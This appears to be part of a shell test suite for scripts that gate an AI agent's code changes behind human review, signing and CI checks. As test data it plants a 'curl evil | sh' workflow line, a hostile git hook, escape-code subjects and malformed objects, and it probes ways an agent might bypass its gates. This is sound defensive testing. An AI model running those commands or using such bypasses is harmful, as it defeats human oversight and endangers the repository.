  printf '#!/bin/sh\n{ echo "$1"; env | grep "^LESS" | sort; } >"%s/less.log"\nshift; cat "$@"\n' "$W" >"$W/pager/less"; chmod +x "$W/pager/less"
  echo weak >>loop/SPEC.md; printf 'n\n' | LESS=-S LESSOPEN='|cat %s' LESSCLOSE=x LESSKEY=x LESSKEYIN=x LESSKEY_CONTENT=x PATH="$W/pager:$PATH" pty "'$K/land.sh' --reviewed" >/dev/null 2>&1
  chk "the pager takes its options from land.sh, not from your shell" "$(tr '\n' ' ' <"$W/less.log")" "-FX LESS= LESSSECURE=1 "; reset
else echo "   (no terminal to be had here, so the pager is not tested)"; fi
for byte in '\r' '\033' '\177' '\000' '\014' '\010' '\302\205' '\342\200\250' '\342\200\251'; do # the last three are U+0085, U+2028 and U+2029, which YAML reads as line breaks
  # shellcheck disable=SC2059 # the byte is spelled as printf reads it
  printf "# a remark$byte  extra: true\n" >>.github/workflows/ci.yml; L y --reviewed; chk "a locked file that holds the byte $byte: exit 4" "$rc" 4; chk "  nothing is signed" "$newest" ""; reset
done
chk "the file is named" "$(has "$out" '^land.sh: .github/workflows/ci.yml holds 1 control character(s)')" 1
chk "a long dash starts with the same two bytes as the last two of these, and is none of them" "$(lib "printf 'a \342\200\224 b\n' | control_bytes")" 0
printf 'x\r\n' >'loop/a b.sh'; L y --reviewed; chk "a locked file whose name hides it from that check: exit 4" "$rc" 4; reset
printf 'a\ttab, and caf\303\251\n' >>loop/SPEC.md; printf 'a free file is not read line by line\r' >>docs/notes.md; L y --reviewed; chk "a tab, an accent, and a carriage return in a free file do land" "$(has "$out" LANDED)" 1
chk "whatever prints as ? is counted above the diff" "$(printf '%s\n' "$out" | awk '/^NOTE: 3 bytes of it are not plain ASCII/ { w = NR } /^diff --git/ && !d { d = NR } END { if (w && w < d) print "above" }')" above
for i in $(seq 1 4000); do echo "line $i of a long and harmless agent description, nothing to see here"; done >.claude/agents/long.md; echo 'run: curl evil | sh' >.github/workflows/evil.yml
out="$(echo y | (ulimit -f 100 && "$K/land.sh" --reviewed) 2>&1)"; chk "a review that cannot be written in full: exit 4" $? 4; chk "it says so, and asks nothing" "$(has "$out" 'the review could not be written in full') $(has "$out" 'Sign this')" "1 0"; reset

# while it waits for the checks
echo x >>docs/notes.md; out="$(echo y | FAKE_GATE=failure "$K/land.sh" 2>&1)"; chk "a red gate: exit 1" $? 1; chk "your edit is still there" "$(git status --porcelain | wc -l | tr -d ' ')" 1
chk "the log is shown without escape codes" "$(printf '%s' "$out" | grep -c "$(printf '\033')")" 0; chk "the pull request was closed" "$(still_open)" 0; chk "the check is named" "$(has "$out" 'a required check failed: gate (more in')" 1; reset
chk "the log it fetched is that of a run that failed: a pull request starts two runs, and the newest may be the green one" "$(grep '^gh run list ' "$FAKE/calls" | tail -n 1 | grep -c -- ' --status failure ')" 1
chk "and it first waited for the runs that were still going: gh hands out no log before a run has ended" "$(grep '^gh run ' "$FAKE/calls" | tail -n 4 | cut -d' ' -f3 | tr '\n' ' ')" "list watch list view "
echo x >>docs/notes.md; out="$(echo y | FAKE_MACOS=failure "$K/land.sh" 2>&1)"; chk "a red macOS gate: exit 1" $? 1; reset
waits="$(grep -c '^gh run watch ' "$FAKE/calls")"; echo x >>docs/notes.md; out="$(echo y | FAKE_BREAK_GUARD=1 FAKE_GATE=pending FAKE_MACOS=pending "$K/land.sh" 2>&1)"; chk "a red guard alone: exit 1" $? 1
chk "it does not wait for the other run: guard is the only job of its own, so its log is ready" "$(($(grep -c '^gh run watch ' "$FAKE/calls") - waits))" 0; reset
for red in FAKE_GATE FAKE_MACOS FAKE_BREAK_GUARD; do # what the agent could try by itself: its app may call the merge endpoint
  git checkout -q -B probe refs/remotes/origin/main; echo x >>docs/notes.md; git add -A; $U; git push -q origin "HEAD:refs/heads/claude/$red"
  url="$(env "$red=failure" gh pr create --repo o/r --base main --head "claude/$red" --title "U-004: x" --body b)"
  chk "$red red: the merge job leaves the agent's pull request alone" "$(cat "$FAKE/pr/${url##*/}/state")" OPEN
  gh api -X PUT "repos/o/r/pulls/${url##*/}/merge" >/dev/null 2>&1
  chk "and GitHub refuses the agent's own call to the merge endpoint" "$(cat "$FAKE/pr/${url##*/}/state")" OPEN
  gh pr close "$url" --delete-branch; git checkout -q main; git branch -qD probe; reset
done
echo x >>docs/notes.md; out="$(echo y | FAKE_EXTRA_RED=1 "$K/land.sh" 2>&1)"; chk "a red check that is not a required one is ignored" "$(has "$out" LANDED)" 1; reset
# Another app, the agent's own for one, has posted a failed check run named gate. Whoever asks for those of GitHub Actions (app 15368) does not see it.
mkdir -p "$W/other-app"
# shellcheck disable=SC2016
printf '%s\n' '#!/bin/sh' 'case "$*" in' '  *check-runs*app_id=15368*) ;;' '  *check-runs*check_name=gate[!-]*)' '    for word; do if [ "${last:-}" = --jq ]; then filter="$word"; fi; last="$word"; done' \
  "    echo '{\"check_runs\":[{\"name\":\"gate\",\"conclusion\":\"failure\",\"app\":{\"id\":1}}]}' | jq -r \"\$filter\"; exit ;;" 'esac' "exec \"$W/bin/gh\" \"\$@\"" >"$W/other-app/gh"; chmod +x "$W/other-app/gh"
echo x >>docs/notes.md; out="$(echo y | PATH="$W/other-app:$PATH" FAKE_MACOS=pending "$K/land.sh" 2>&1)"; chk "while the real checks run, a failed check run named gate from another app is not taken for one of them" "$? $(has "$out" 'a required check failed')" "2 0"; reset
echo x >>docs/notes.md; out="$(echo y | PATH="$W/other-app:$PATH" "$K/land.sh" 2>&1)"; chk "and it does not stop a landing" "$(has "$out" LANDED)" 1; reset
chk "(that stand-in does show it to a caller who names no app)" "$("$W/other-app/gh" api 'repos/o/r/commits/x/check-runs?check_name=gate&filter=all' --jq '.check_runs[].conclusion')" failure
echo x >>docs/notes.md; out="$(echo y | FAKE_GATE=pending FAKE_FAIL='api repos/*/check-runs*' "$K/land.sh" 2>&1)"; chk "a question to GitHub that fails while it waits is not a red check, though gh then prints GitHub's error text" "$? $(has "$out" 'a required check failed')" "2 0"; reset
echo x >>docs/notes.md; out="$(echo y | FAKE_GATE=pending "$K/land.sh" 2>&1)"; chk "checks that never finish: exit 2" $? 2; chk "and no pull request is left behind" "$(still_open)" 0
chk "it says how long the signed commit stays good, and what to do about it" "$(has "$out" '^The signed commit [0-9a-f]\{12\} is public\. Anyone who can open a pull request can still land it until main moves\.$') $(has "$out" '^If you have changed your mind, first put the change aside (git stash -u), then land any other change before you switch the task on again\. Waiting is not enough\.$')" "1 1"; reset
echo x >>docs/notes.md; out="$(echo y | FAKE_GATE=pending FAKE_MOVE=1 "$K/land.sh" 2>&1)"; chk "main moves while it waits: exit 3" $? 3; chk "(that signature fits nothing any more, so no such warning)" "$(has "$out" 'is public')" 0; reset
echo x >>docs/notes.md; echo y >"$W/answer"; FAKE_GATE=pending LAND_SLEEP=1 LAND_POLLS=300 "$K/land.sh" <"$W/answer" >"$W/hup.out" 2>&1 &
pid=$!; for _ in $(seq 1 120); do if grep -q 'waiting for' "$W/hup.out"; then break; fi; sleep 1; done
chk "(it waits, with its pull request open)" "$(still_open)" 1; kill -HUP "$pid"; wait "$pid"; chk "you close the terminal window while it waits: exit 1" $? 1; chk "and no pull request is left behind" "$(still_open)" 0; reset
mkdir -p "$W/closer"
# shellcheck disable=SC2016
printf '#!/bin/sh\ncase "$1 $2" in "pr view") echo CLOSED >"$FAKE/pr/${3##*/}/state" ;; esac\nexec "%s/bin/gh" "$@"\n' "$W" >"$W/closer/gh"; chmod +x "$W/closer/gh"
echo x >>docs/notes.md; tries="$(grep -c '/merge' "$FAKE/calls")"; out="$(echo y | PATH="$W/closer:$PATH" FAKE_GATE=pending LAND_POLLS=50 "$K/land.sh" 2>&1)"; chk "someone closes the pull request: exit 1" $? 1
chk "it says so, and gives up at once" "$(has "$out" 'someone closed the pull request') $(($(grep -c '/merge' "$FAKE/calls") - tries))" "1 1"; reset
echo x >>docs/notes.md; mkdir -p "$FAKE/pr/900" "$FAKE/pr/899"; echo OPEN >"$FAKE/pr/900/state"; echo claude/U-004-20261031T101500Z >"$FAKE/pr/900/head"; echo OPEN >"$FAKE/pr/899/state"; printf 'mac/\033]0;x' >"$FAKE/pr/899/head"
L y; chk "one of your pull requests is open: exit 3" "$rc" 3; chk "each is listed, by number and branch" "$(has "$out" '^  #900 claude/U-004-20261031T101500Z$') $(has "$out" '^  #899 mac/?]0;x$')" "1 1"
chk "and it says what to do about a dead one" "$(has "$out" 'or a try: whose run is dead, close it on GitHub and run this again$')" 1; rm -rf "$FAKE/pr/900" "$FAKE/pr/899"
mkdir -p "$FAKE/pr/901"; echo OPEN >"$FAKE/pr/901/state"; : >"$FAKE/pr/901/fork"; L y; chk "an outsider's pull request does not block you" "$(has "$out" LANDED)" 1; rm -rf "$FAKE/pr/901"; reset
for b in $(og for-each-ref --format='%(refname)' 'refs/heads/mac/*'); do og update-ref -d "$b"; done; og update-ref refs/heads/mac "$(og rev-parse refs/heads/main)"
echo x >>docs/notes.md; L y; chk "a branch named mac leaves no room for mac/...: exit 2" "$rc" 2; chk "and it says what to delete" "$(has "$out" 'Delete the branch mac on GitHub, then run this again')" 1; og update-ref -d refs/heads/mac
git config remote.origin.pushurl "file://$W/nowhere.git"; L y; chk "(a push that fails for another reason does not blame such a branch)" "$rc $(has "$out" 'land.sh: push failed$')" "2 1"; git config --unset remote.origin.pushurl; reset
echo x >>docs/notes.md; out="$(echo y | FAKE_TOUCH="$R/docs/later.md" "$K/land.sh" 2>&1)"; chk "an edit made while it waits survives" "$(head -n 1 docs/later.md 2>/dev/null)" "edited while waiting"; reset
server 'echo cloud >>docs/cloud.md' "U-900: cloud work (#0)"; echo mine >>docs/notes.md; L y; chk "a clone that is behind catches up by itself" "$(has "$out" LANDED)" 1; chk "and undoes nothing" "$(og show refs/heads/main:docs/cloud.md)" cloud; reset
server 'echo cloud >>docs/notes.md' "U-901: same file (#0)"; echo mine >>docs/notes.md; L y; chk "unless your edit is in the way: exit 3" "$rc" 3; chk "and then it names all three commands" "$(has "$out" 'git stash pop')" 1; reset
echo weak >>loop/SPEC.md; git add -A; twin="$(git -c commit.gpgsign=false commit-tree "$(git write-tree)" -p "$(git rev-parse 'refs/remotes/origin/main^')" -m twin)"; git reset -q
git update-ref "refs/replace/$(git rev-parse refs/remotes/origin/main)" "$twin"; L y; chk "a replace ref cannot hide a locked edit" "$rc" 4; git update-ref -d "refs/replace/$(git rev-parse refs/remotes/origin/main)"
git tag origin/main "$twin"; git tag main "$twin"; L y 2>/dev/null; chk "nor can tags named like the branch" "$rc" 4; git tag -d origin/main main >/dev/null; reset
og tag origin/main "$(og rev-parse 'refs/heads/main^')"; echo x >>docs/notes.md; L y; chk "a hostile tag on GitHub is never fetched" "$(git tag --list 'origin/*' | wc -l | tr -d ' ')" 0; og tag -d origin/main >/dev/null; reset
echo x >>docs/notes.md; echo . >.git/commondir; L y; chk ".git/commondir is refused" "$rc" 4; rm -f .git/commondir
git config extensions.worktreeConfig true; L y; chk "so is a per-worktree configuration" "$rc" 4; git config --unset extensions.worktreeConfig; reset
echo x >>docs/notes.md; out="$(echo y | PATH="$W/noawk:$PATH" "$K/land.sh" 2>&1)"; chk "a broken path filter: nothing is signed" $? 4; reset
good="$(og rev-parse refs/heads/main)"; server 'echo "# weak" >>loop/guard.sh' "U-902: tampered (#0)"; echo x >>docs/notes.md; L y; chk "nothing is signed while main's locked files differ from your kit" "$rc" 4; restore

# the kit and main: the same bytes, the same kind of file, the same executable bit, wherever a locked file lies
keep="$good"
server 'chmod -x loop/guard.sh; chmod +x loop/SPEC.md' "U-903: modes (#0)"; pf; chk "preflight notices a locked script that lost its executable bit" "$rc $(has "$out" 'executable only in the kit: loop/guard.sh')" "1 1"
chk "and a locked text that gained one" "$(has "$out" 'executable only in the repository: loop/SPEC.md')" 1; restore
server "rm .github/maintainer.fpr; ln -s '$ME
' .github/maintainer.fpr" "U-904: a link with the file's own bytes (#0)"; chk "(the link's blob is the file's blob)" "$(og rev-parse refs/heads/main:.github/maintainer.fpr)" "$(og rev-parse "$good:.github/maintainer.fpr")"
pf; chk "preflight notices a locked file that became a link with the same bytes" "$rc $(has "$out" 'not a plain file in the repository: .github/maintainer.fpr')" "1 1"; restore
echo 'all:' >Makefile; L y --reviewed "add a Makefile"; chk "(a locked file of a new name lands, and the kit receives it)" "$(has "$out" 'kit updated: Makefile')" 1; good="$(og rev-parse refs/heads/main)"
server 'git rm -q Makefile' "U-905: gone (#0)"; pf; chk "preflight notices that main lost it" "$rc $(has "$out" 'only in the kit: Makefile')" "1 1"; restore
git rm -q Makefile CODE_OF_CONDUCT.md; L y --reviewed "drop two files"; chk "you delete a top-level locked file" "$(has "$out" LANDED) $(has "$out" 'kit updated: CODE_OF_CONDUCT.md (removed)')" "1 1"
pf; chk "preflight is content" "$rc" 0; echo x >>docs/notes.md; L y; chk "and the next landing works" "$(has "$out" LANDED)" 1
mkdir -p tools/lint; echo a >tools/lint/a.sh; echo b >tools/lint/b.sh; L y --reviewed "add tools"; rm -rf tools/lint; echo one >tools/lint; L y --reviewed "a directory becomes a file"
chk "a locked directory becomes a file: the kit follows" "$(has "$out" 'kit updated: tools/lint$') $(cat "$W/loopkit/tools/lint" 2>/dev/null)" "1 one"; pf; chk "and preflight is content" "$rc" 0
rm tools/lint; mkdir -p tools/lint; echo c >tools/lint/c.sh; chmod +x tools/lint/c.sh; L y --reviewed "and a directory again"; chk "and back: the kit follows" "$([ -x "$W/loopkit/tools/lint/c.sh" ] && echo x)" x; pf; chk "and preflight is content" "$rc" 0
chmod -x tools/lint/c.sh; L y --reviewed "not executable after all"; chk "a change of mode alone reaches the kit" "$([ -x "$W/loopkit/tools/lint/c.sh" ] && echo x)" ""; pf; chk "and preflight is content" "$rc" 0
ln -s c.sh tools/lint/link.sh; L y --reviewed "a link"; chk "what the kit cannot follow is named after the landing" "$(has "$out" LANDED) $(has "$out" '^Your kit still differs from what you signed') $(has "$out" '^  only in the repository: tools/lint/link.sh$')" "1 1 1"
good="$keep"; restore; rm -rf "${W:?}/loopkit/tools"; cp CODE_OF_CONDUCT.md "$W/loopkit/"; pf; chk "(main and the kit are put back as they were)" "$rc" 0

# the key that guard trusts
cp "$W/loopkit/.github/maintainer.asc" "$W/keep.asc"; cp "$W/loopkit/.github/maintainer.fpr" "$W/keep.fpr"; pushed="$(og for-each-ref 'refs/heads/mac/*' | wc -l)"
nokey() { L y --reviewed; chk "$1: exit 4" "$rc $(has "$out" 'after this change guard could not verify your signature')" "4 1"; reset; } # nokey <what>
: >.github/maintainer.fpr; nokey "an empty fingerprint file"
echo "$ME" | tr 'A-F' 'a-f' >.github/maintainer.fpr; nokey "a fingerprint in small letters"
echo "${ME%?}" >.github/maintainer.fpr; nokey "a fingerprint that is one digit short"
printf '%s\n%s\n' "$ME" "$OTHER" >.github/maintainer.fpr; nokey "two fingerprints"
git rm -q .github/maintainer.fpr; nokey "no fingerprint file"
gpg --armor --export "$OTHER" >.github/maintainer.asc; nokey "a key file that holds another key"
echo "not a key" >.github/maintainer.asc; nokey "a key file that holds no key"
{ cat "$W/keep.asc"; head -n 6 "$W/keep.asc"; } >.github/maintainer.asc; nokey "a key file that holds your key, and then a second block that is cut short: guard stops at any fault that gpg finds"
echo "$OTHER" >.github/maintainer.fpr; nokey "another key's fingerprint beside your key file"
chk "none of these was pushed, recorded or copied to the kit" "$(og for-each-ref 'refs/heads/mac/*' | wc -l) $(cmp -s "$W/keep.fpr" "$W/loopkit/.github/maintainer.fpr" && echo same)" "$pushed same"
gpg --armor --comment renewed --export "$ME" >.github/maintainer.asc; L y --reviewed "renew the key file"; chk "a fresh export of the same key lands" "$(has "$out" LANDED)" 1
gpg --armor --export "$OTHER" >.github/maintainer.asc; echo "$OTHER" >.github/maintainer.fpr; L y --reviewed "change to a new key"; chk "a change to a new key, as REFERENCE.md section 8 has it: signed with the old one, it lands" "$(has "$out" LANDED)" 1
chk "and the kit pins the new key" "$(cat "$W/loopkit/.github/maintainer.fpr")" "$OTHER"; git config user.signingkey "$OTHER"; echo x >>loop/SPEC.md; L y --reviewed; chk "which signs the next landing" "$(has "$out" LANDED)" 1
git config user.signingkey "$ME"; cp "$W/keep.asc" "$W/loopkit/.github/maintainer.asc"; cp "$W/keep.fpr" "$W/loopkit/.github/maintainer.fpr"; restore; cp loop/SPEC.md "$K/SPEC.md"; pf; chk "(the old key is back for the rest of these tests)" "$rc" 0

# when the checks themselves are broken: REFERENCE.md section 8
echo '# repaired' >>.github/workflows/ci.yml; out="$(echo y | FAKE_GATE=failure "$K/land.sh" --reviewed 2>&1)"; chk "(broken checks: nothing can land, not even the repair)" $? 1
main_rs="$(grep -l '"loop: main' "$FAKE"/rulesets/*.json)"; cp "$main_rs" "$W/keep.json"; jq '.enforcement = "disabled"' "$W/keep.json" >"$main_rs"
out="$(echo y | FAKE_GATE=failure "$K/land.sh" --reviewed 2>&1)"; chk "with the ruleset switched off by you, the repair lands" "$(has "$out" LANDED)" 1
"$K/settings.sh" apply >/dev/null 2>&1; chk "and settings.sh apply switches it on again" $? 0; reset
chk "no scratch files are left behind" "$(find "$LOOP_OUT" -maxdepth 1 -name 'tmp.*' | wc -l | tr -d ' ')" 0

# ---------------------------------------------------------------- land --from
echo "## land.sh --from a hand-over file"
A="$W/other-account/work" H="$W/handover.bundle"
fresh() { rm -rf "$A" "$H"; git clone -q -b main "file://$W/origin.git" "$A"; }
hand() { (cd "$A" && git add -A && git -c commit.gpgsign=false commit -qm "${1:-U-777: add a file}" && git bundle create -q "$H" refs/remotes/origin/main..HEAD); }
their() { (cd "$A" && LC_ALL=C sed "$1" "$PLAN" >"$PLAN.tmp" && mv "$PLAN.tmp" "$PLAN"); } # their <sed script>: the agent edits its copy of the plan
fresh; echo 'package main' >"$A/cmd/extra.go"; hand; L y --from "$H"; chk "free work lands" "$(has "$out" LANDED)" 1
chk "with the agent's subject, which you saw first" "$(has "$out" '^Subject: U-777: add a file')" 1; chk "your clone follows" "$(git rev-parse HEAD)" "$(git rev-parse refs/remotes/origin/main)"
chk "you signed it, the agent did not" "$(git verify-commit --raw "$newest" 2>&1 | grep -c "VALIDSIG .*$ME")" 1
fresh; echo weak >>"$A/loop/SPEC.md"; hand; L y --from "$H"; chk "a locked edit is refused" "$rc" 4
out="$(echo y | "$K/land.sh" --from "$H" --reviewed 2>&1)"; chk "--from then --reviewed is refused" $? 2; out="$(echo y | "$K/land.sh" --reviewed --from "$H" 2>&1)"; chk "--reviewed then --from is refused" $? 2
fresh; their "$tick"; hand; L y --from "$H"; chk "an agent may not tick a gate" "$rc" 4
fresh; gate="$(cd "$A" && line_of H-103)"; their "$tick"; echo "$gate" >>"$A/$PLAN"; hand; L y --from "$H"; chk "nor tick it and park the old line elsewhere" "$rc" 4
fresh; their '/^- \[ \] U-200 /s/deps:H-103/deps:-/'; hand; L y --from "$H"; chk "nor cut a unit loose from its gate" "$rc" 4; chk "it is told why" "$(has "$out" 'an agent may not change a human gate, drop a gate dependency, or touch')" 1
fresh; mkdir -p "$A/docs/adr/accepted"; echo 'status: accepted' >"$A/docs/adr/accepted/001-vmm.md"; hand; L y --from "$H"; chk "nor accept its own decision" "$rc" 4
fresh; printf '## 2026-10-31T10:15Z - RESUME\n\000\n' >>"$A/$LOG"; hand; L y --from "$H"; chk "nor clear its own halt behind a NUL byte" "$rc" 4
fresh; printf '## 2026-10-31T10:15Z \377- RESUME\n' >>"$A/$LOG"; hand; LC_ALL="$utf8" LANG="$utf8" L y --from "$H"; chk "or behind a byte that is not UTF-8, in your UTF-8 terminal" "$rc" 4
fresh; their "$(printf 's/^- \\[H\\] H-103 /- [x] H-103 \377/')"; hand; LC_ALL="$utf8" LANG="$utf8" L y --from "$H"; chk "the same for a gate line with such a byte" "$rc" 4
fresh; LC_ALL=C sed '$d' "$A/$LOG" >"$A/x.tmp" && mv "$A/x.tmp" "$A/$LOG"; hand; L y --from "$H"; chk "nor drop a line of the log" "$rc" 4
fresh; their 's/^- \[ \] U-702 /- [x] U-702 /'; echo '## 2026-10-31T10:15Z U-702 PASS mode=mac model=sonnet tries=0' >>"$A/$LOG"; echo 'package k' >"$A/internal/k.go"; hand "U-702: keychain"
L y --from "$H"; chk "a finished piece lands: code, a ticked unit, a log entry. The plan is big, so git sends it as a difference" "$(has "$out" LANDED)" 1
fresh; ln -s "$W/secret" "$A/cmd/key.go"; hand; L y --from "$H"; chk "a symbolic link inside is refused" "$rc" 4
fresh; (cd "$A" && git update-index --add --cacheinfo "160000,$(git rev-parse HEAD),cmd/sub" && $U && git bundle create -q "$H" refs/remotes/origin/main..HEAD); L y --from "$H"; chk "a submodule inside is refused" "$rc" 4
fresh; echo x >"$A/docs/s.md"; hand "$RV"; L y --from "$H"; chk "a subject that imitates the marker is replaced" "$(git log -1 --format=%s refs/remotes/origin/main | grep -c "^loop: change from the maintainer's Mac")" 1
chk "and the signature still says none" "$(git cat-file commit "$newest" | tail -n 1)" "Locked-paths: none"
fresh; echo x >"$A/docs/t.md"; hand "$(printf 'U-1: \033]0;evil\007')"; L y --from "$H"; chk "a subject with control bytes is replaced" "$(printf '%s' "$out" | grep -c "$(printf '\033')")" 0
git config --global log.showSignature true; git config --global color.ui always
fresh; echo x >"$A/docs/sig.md"; (cd "$A" && git add -A && git -c user.signingkey="$OTHER" commit -qS -m "U-702: signed by someone else" && git bundle create -q "$H" refs/remotes/origin/main..HEAD); L n --from "$H"
chk "signatures and colours in your git settings do not reach the subject" "$(has "$out" '^Subject: U-702: signed by someone else$') $(printf '%s' "$out" | grep -c "$(printf '\033')")" "1 0"
git config --global --unset color.ui
fresh; echo x >"$A/docs/u.md"; hand; server 'echo newer >>docs/newer.md' "U-903: newer (#0)"; L y --from "$H"; chk "a hand-over made from an older main: exit 3" "$rc" 3; chk "so newer work is not undone" "$(og show refs/heads/main:docs/newer.md)" newer
chk "it says how to keep the work" "$(has "$out" 'tell Claude that main moved (PROMPT.md section 7b says how it brings the work up to date), then hand over again')" 1; reset
(cd "$A" && git fetch -q --no-tags origin +refs/heads/main:refs/remotes/origin/main && git -c commit.gpgsign=false merge -q --no-edit refs/remotes/origin/main && git bundle create -q "$H" refs/remotes/origin/main..HEAD)
L y --from "$H"; chk "brought up to date that way, the same work lands" "$(has "$out" LANDED) $(og show refs/heads/main:docs/u.md) $(og show refs/heads/main:docs/newer.md)" "1 x newer"
token="s3cret-$RANDOM-$RANDOM"; echo "-----BEGIN PRIVATE KEY----- $token" >"$W/secret"; L y --from "$W/secret"; chk "a file that is not a hand-over: exit 3" "$rc" 3
ln -s "$W/secret" "$W/link.bundle"; L y --from "$W/link.bundle"; chk "a link in place of the file: exit 2" "$rc" 2
chk "the secret reached neither GitHub nor the object store" "$(git cat-file --batch-all-objects --batch-check 2>/dev/null | awk '$2 == "blob" { print $1 }' | while read -r o; do git cat-file blob "$o" | grep -c "$token"; done | grep -vc '^0$')" 0
# every object is checked, whatever git's version, and only the plain form of a bundle is taken
fresh; tab="$(printf '\t')"
# shellcheck disable=SC2059 # the object id, spelled as bytes
(cd "$A" && odd="$(printf "0100644 x.go\\0$(echo 'package x' | git hash-object -w --stdin | sed 's/../\\x&/g')" | git hash-object -t tree --literally -w --stdin)" &&
  sub="$( (git ls-tree HEAD:cmd && printf '040000 tree %s\tpadded\n' "$odd") | git mktree)" && root="$(git ls-tree HEAD | sed "s/^040000 tree [0-9a-f]*\(${tab}cmd\)\$/040000 tree $sub\1/" | git mktree)" &&
  git reset -q --soft "$(git -c commit.gpgsign=false commit-tree "$root" -p HEAD -m "U-777: a padded mode")" && git bundle create -q "$H" refs/remotes/origin/main..HEAD)
chk "(a hand-over whose tree holds a mode with a leading zero; the path itself is free)" "$(git -C "$A" ls-tree -r --name-only HEAD -- cmd/padded)" cmd/padded/x.go
L y --from "$H"; chk "a malformed object inside: exit 4" "$rc" 4; chk "before any question" "$(has "$out" 'Sign this')" 0
# shellcheck disable=SC2059 # the object id, spelled as bytes
odd() { # odd <mode> <blob|tree> <name>: a hand-over that adds cmd/odd/<name>, a file or an empty folder, with that mode. git's own check of the objects lets both pass
  fresh
  (cd "$A" && inner="$(printf "$1 $3\\0$(if [ "$2" = blob ]; then echo 'package x'; fi | git hash-object -t "$2" -w --stdin | sed 's/../\\x&/g')" | git hash-object -t tree --literally -w --stdin)" &&
    sub="$( (git ls-tree HEAD:cmd && printf '040000 tree %s\todd\n' "$inner") | git mktree)" && root="$(git ls-tree HEAD | sed "s/^040000 tree [0-9a-f]*\(${tab}cmd\)\$/040000 tree $sub\1/" | git mktree)" &&
    git reset -q --soft "$(git -c commit.gpgsign=false commit-tree "$root" -p HEAD -m "U-777: an odd tree")" && git bundle create -q "$H" refs/remotes/origin/main..HEAD)
  L y --from "$H"
}
odd 100664 blob x.go; chk "a file mode that git never writes, which no merge would keep: exit 4, before any question" "$rc $(has "$out" 'its tree holds file modes or empty folders that git never writes') $(has "$out" 'Sign this')" "4 1 0"
odd 40000 tree nothing; chk "an empty folder, so that the list of files you would sign is empty: the same" "$rc $(has "$out" 'its tree holds file modes or empty folders that git never writes') $(has "$out" 'Sign this')" "4 1 0"
fresh; echo x >"$A/docs/h.md"; (cd "$A" && git add -A && $U && git bundle create -q "$H" refs/remotes/origin/main..refs/heads/main); L y --from "$H"; chk "a bundle that names no HEAD: exit 4" "$rc" 4
hand_again() { (cd "$A" && git bundle create -q "$@" "$H" refs/remotes/origin/main..HEAD); }
hand_again; cut_at="$(LC_ALL=C grep -a -n -m 1 '^$' "$H" | cut -d: -f1)"
{ head -n "$((cut_at - 1))" "$H"; echo "$(git rev-parse refs/remotes/origin/main) HEAD"; tail -n "+$cut_at" "$H"; } >"$H.two"; L y --from "$H.two"; chk "one that names two: exit 4" "$rc" 4
hand_again --version=3; chk "(a bundle of version 3 has lines that switch features on)" "$(head -n 2 "$H" | tr '\n' ' ')" "# v3 git bundle @object-format=sha1 "; L y --from "$H"; chk "version 3: exit 4" "$rc" 4
hand_again; { echo '# v3 git bundle'; tail -n +2 "$H"; } >"$H.three"; chk "(git itself takes version 3 without such lines)" "$(git bundle verify "$H.three" >/dev/null 2>&1; echo $?)" 0; L y --from "$H.three"; chk "that too: exit 4" "$rc" 4
L y --from "$H"; chk "(the same work in the plain form lands)" "$(has "$out" LANDED)" 1
chk "no ref is left behind" "$(git for-each-ref refs/loop/incoming | wc -l | tr -d ' ')" 0
fresh; echo x >"$A/docs/v.md"; hand; echo mine >>docs/notes.md; L y --from "$H"; chk "refuses if your own clone has edits" "$rc" 2; chk "and names them" "$(has "$out" '^.. docs/notes\.md$')" 1; reset
echo .envrc >"$W/ignore"; git config --global core.excludesFile "$W/ignore"; echo x >.envrc; chk "(your own git status does not show a file that your global ignore list hides)" "$(git status --porcelain | wc -l | tr -d ' ')" 0
L y --from "$H"; chk "to these scripts it is an edit like any other, so it is named, and so is the reason" "$rc $(has "$out" '^?? .envrc$') $(has "$out" 'Files that only your own global ignore list hides count too')" "2 1 1"
out="$("$K/adopt.sh" 2>&1 </dev/null)"; chk "adopt.sh does the same" "$? $(has "$out" '^?? .envrc$') $(has "$out" 'Files that only your own global ignore list hides count too')" "2 1 1"; git config --global --unset core.excludesFile; reset
fresh; git -C "$A" config core.fsmonitor "$W/evil.sh"; git -C "$A" config core.hooksPath "$W"; printf '#!/bin/sh\necho ran >>%s/agent-ran\n' "$W" >"$W/evil.sh"; chmod +x "$W/evil.sh"
echo x >"$A/docs/w.md"; (cd "$A" && git -c core.fsmonitor=false -c core.hooksPath=/dev/null add -A && git -c core.fsmonitor=false -c core.hooksPath=/dev/null -c commit.gpgsign=false commit -qm "U-778: w" && git -c core.fsmonitor=false bundle create -q "$H" refs/remotes/origin/main..HEAD)
rm -f "$W/agent-ran"; L y --from "$H"; chk "nothing in the agent's folder is ever consulted" "$([ -e "$W/agent-ran" ] && echo ran || echo quiet)" quiet; chk "and the work lands" "$(has "$out" LANDED)" 1

# ---------------------------------------------------------------- adopt
echo "## adopt.sh"
server 'mkdir -p proposed/dot-github/workflows; echo "name: extra" >proposed/dot-github/workflows/extra.yml; printf "#!/bin/sh\n" >proposed/tool.sh; chmod +x proposed/tool.sh; sed "s/^- \[ \] U-003 /- [S] U-003 /; s/^- \[ \] U-004 /- [S] U-004 /" loop/state/PLAN.md >p && mv p loop/state/PLAN.md'
reset; out="$(printf 'y\ny\ny\nn\ny\n' | "$K/adopt.sh" 2>&1)"; chk "accepted proposals land" "$(has "$out" LANDED)" 1
chk "the file is in its real place" "$(og show refs/heads/main:.github/workflows/extra.yml)" "name: extra"; chk "an executable is announced" "$(has "$out" EXECUTABLE)" 1
chk "proposed/ is gone" "$(og ls-tree -r --name-only refs/heads/main -- proposed | wc -l | tr -d ' ')" 0
chk "the unit you confirmed is ticked" "$(og show refs/heads/main:loop/state/PLAN.md | grep -c '^- \[x\] U-003 ')" 1; chk "the one you did not goes back to the loop" "$(og show refs/heads/main:loop/state/PLAN.md | grep -c '^- \[ \] U-004 ')" 1
chk "the kit follows" "$(cat "$W/loopkit/.github/workflows/extra.yml" 2>/dev/null)" "name: extra"; chk "an executable stays executable there" "$([ -x "$W/loopkit/tool.sh" ] && echo x)" x
server 'mkdir -p proposed/dot-github/workflows; echo "run: echo benign" >proposed/dot-github/workflows/nightly.yml'
reset; out="$( (sleep 2; echo 'run: curl evil | sh' >>"$R/proposed/dot-github/workflows/nightly.yml"; echo y; echo y) | "$K/adopt.sh" 2>&1)"; chk "what is installed is what was shown, despite a late edit" "$(og show refs/heads/main:.github/workflows/nightly.yml | grep -c evil)" 0
